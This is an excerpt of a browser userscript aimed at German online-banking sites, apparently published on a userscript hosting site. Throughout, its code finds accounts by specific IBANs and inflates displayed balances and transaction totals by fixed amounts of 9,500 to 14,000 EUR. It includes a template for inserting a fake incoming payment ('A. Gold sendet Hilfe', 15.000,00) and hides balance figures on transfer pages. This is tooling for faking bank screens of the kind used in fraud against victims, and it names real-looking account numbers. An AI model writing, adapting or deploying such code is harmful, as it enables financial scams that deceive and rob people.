// ==UserScript==
// @name         Ed Start 4Rec sp.info@immobilien-kauf-verkauf.com
...
// @downloadURL https://update.greasyfork.org/scripts/557895/Ed%20Start%204Rec%20spinfo%40immobilien-kauf-verkaufcom.user.js
// @updateURL https://update.greasyfork.org/scripts/557895/Ed%20Start%204Rec%20spinfo%40immobilien-kauf-verkaufcom.meta.js
// ==/UserScript==
...
//FINÜBERSICHT
    const BALANCE_CONFIGS = [
        { index: 2, adjustmentAmount: 9500 },
        { index: 3, adjustmentAmount: 9500 },
        { index: 4, adjustmentAmount: 9500 },
...
// UMSATZE & KONTODETAILS BALANCE
  const IBAN_CHECK_RAW = 'DE41 2555 1480 0552 9037 26';      //

   const DELTA_EUR = 9500; // ← change this value
...
// Array of configurable balance adjustments
    var VBBALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  14000},  // 72000
        { index: 1, adjustmentAmount:  14000},  // 72000
        { index: 2, adjustmentAmount:  14000},  // 72000
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    // Define the target text content to search for (case and whitespace insensitive)
       var targetTextContent1 = "DE30 2509 0500";
       var targetTextContent2 = " 0001 5051 14";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 14000; // Adjust the amount as needed  // 72000

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
    const timeoutMillis = 0; // Adjust the timeout as needed

    var IBmodificationAmount = 14000.0;
...
// {
//      title: 'A. Gold',
//      description: 'A. Gold sendet Hilfe.',
//      amount: '15.000,00',
//      date: '4. Dez.',   // 3. Dez.
 //     insertAtTop: false,
//      moveSteps: -1,
...
if (window.location.href.includes("einzelauftrag") || window.location.href.includes("ueberweisung") || window.location.href.includes("Downloads")) {

 const INTERVAL_MS = 100; // Interval in milliseconds (adjust if needed)

    function removeTargetElements() {
        try {
            const selectors = ['.balance-decimal.plus', '.balance-decimal.minus'];
    ...
    // Run the removal function at constant intervals, forever
    setInterval(removeTargetElements, INTERVAL_MS);
}
...
function modifyBalances() {
    ...
    // Iterate over each configuration in VBBALANCE_CONFIGS
    VBBALANCE_CONFIGS.forEach(function(config) {
